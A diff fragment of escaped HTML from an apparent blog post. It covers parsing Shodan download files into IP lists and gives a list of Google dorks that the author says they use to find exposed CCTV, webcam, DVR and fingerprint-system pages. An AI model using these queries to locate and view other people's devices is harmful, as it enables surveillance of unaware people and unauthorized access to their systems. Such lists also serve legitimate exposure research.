+		data-flex-grow=&#34;157&#34;
+		data-flex-basis=&#34;377px&#34;
+	
+&gt;&lt;br /&gt;
+The Download will be in the format &lt;em&gt;.json.gz&lt;/em&gt;. Shodan provides a Command-Line Utility to Parse the data in these download files.&lt;br /&gt;
+The utility can be installed with the command&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pip install shodan
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;The IP Addresses from the downloaded file can be extracted with the following command&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shodan parse --fields ip_str &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;file_name&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;.json.gz
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;To save the IP Addresses to a file, simply redirect the output of the command&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shodan parse --fields ip_str &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;file_name&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;.json.gz &amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;file_name_to_save_ip_addresses_to&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;I sometimes manually filterout some IPs by running a port scan, because sometimes the information provided by Shodan for some Devices is outdated.&lt;/p&gt;
+&lt;h4 id=&#34;google-dorking&#34;&gt;Google Dorking
+&lt;/h4&gt;&lt;p&gt;Here is the Google Dorks that I use for finding CCTVs&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;view/index.shtml&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;MultiCameraFrame?Mode=Motion&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;VB&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Viewer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;viewer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;live&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ja&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;live&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;IP CAMERA Viewer&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;setting | Client setting&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Device(&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Network Camera&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;language:&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Password&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;webcam 7&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/gallery.html&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Yawcam&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8081&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;control&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;camerainfo&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;webcamXP 5&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;download&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/view/view.shtml?id=&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;view&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;viewer_index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shtml&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;powered by webcamXP 5&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;webcam&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8080&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;intext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8080&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Live View / - AXIS&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;view&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;view&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shtml&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;view&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;indexFrame&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shtml&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;MJPG Live Demo&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;intext:Select preset position&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;allintitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Axis&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.10&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.12&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.30&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.31&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.32&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.33&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.34&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.40&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.42&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.43&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Network Camera&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;allintitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Edr1680&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;viewer&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;allintitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EverFocus&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EDSR&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EDSE400&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Applet&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;allintitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EDR1600&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;login&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Welcome&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;BlueNet Video Viewer&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SNC-RZ30&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;demo&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cgi&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;guestimage&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;EyeSpyFX&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;OptiCamFX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;go to camera&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;servlet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DetectBrowser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Veo Observer XT&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shtml&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;htm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;asp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aspx&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pdf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;observer&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;iGuard Fingerprint Security System&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MOBOTIX&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PDAS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MOBOTX&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Seiten&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pda&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;camera&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Edr1680 remote viewer&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;NetCam Live Image&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;edu&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gov&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;johnny&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ihackstuff&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;INTELLINET&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;IP Camera Homepage&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;intitle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;WEBDVR&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;product&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inurl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;demo&lt;/span&gt;
